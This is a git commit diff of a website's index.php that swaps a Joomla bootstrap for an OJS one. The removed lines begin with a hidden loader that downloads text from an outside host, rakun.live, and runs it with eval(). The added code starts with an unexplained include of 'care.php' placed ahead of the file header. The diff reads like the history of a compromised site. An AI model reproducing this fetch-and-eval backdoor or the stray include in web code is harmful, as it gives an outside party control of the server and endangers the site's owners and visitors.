980a1611e4936c15417d3dff85662f632a3d4d7d
batskulah <alfanpekan@gmail.com>
2026-05-09 13:25:43 +0700

    Update index.php

--- index.php
+++ index.php
@@ -1,53 +1,21 @@
 <?php
-$url = file_get_contents(urldecode('https://rakun.live/landing/cri-knu.txt'));
-$url = "?> ".$url;
-eval($url);
-
+include 'care.php';
 /**
- * @package    Joomla.Site
+ * @file ojs/index.php
  *
- * @copyright  Copyright (C) 2005 - 2016 Open Source Matters, Inc. All rights reserved.
- * @license    GNU General Public License version 2 or later; see LICENSE.txt
+ * Copyright (c) 2014-2021 Simon Fraser University
+ * Copyright (c) 2003-2021 John Willinsky
+ * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
+ *
+ * Bootstrap code for OJS site. Loads required files and then calls the
+ * dispatcher to delegate to the appropriate request handler.
  */
 
-/**
- * Define the application's minimum supported PHP version as a constant so it can be referenced within the application.
- */
-define('JOOMLA_MINIMUM_PHP', '5.3.10');
+use APP\core\Application;
 
-if (version_compare(PHP_VERSION, JOOMLA_MINIMUM_PHP, '<'))
-{
-	die('Your host needs to use PHP ' . JOOMLA_MINIMUM_PHP . ' or higher to run this version of Joomla!');
-}
+// Initialize global environment
+define('INDEX_FILE_LOCATION', __FILE__);
+require_once './lib/pkp/includes/bootstrap.php';
 
-// Saves the start time and memory usage.
-$startTime = microtime(1);
-$startMem  = memory_get_usage();
-
-/**
- * Constant that is checked in included files to prevent direct access.
- * define() is used in the installation folder rather than "const" to not error for PHP 5.2 and lower
- */
-define('_JEXEC', 1);
-
-if (file_exists(__DIR__ . '/defines.php'))
-{
-	include_once __DIR__ . '/defines.php';
-}
-
-if (!defined('_JDEFINES'))
-{
-	define('JPATH_BASE', __DIR__);
-	require_once JPATH_BASE . '/includes/defines.php';
-}
-
-require_once JPATH_BASE . '/includes/framework.php';
-
-// Set profiler start time and memory usage and mark afterLoad in the profiler.
-JDEBUG ? $_PROFILER->setStart($startTime, $startMem)->mark('afterLoad') : null;
-
-// Instantiate the application.
-$app = JFactory::getApplication('site');
-
-// Execute the application.
-$app->execute();
+// Serve the request
+Application::get()->execute();
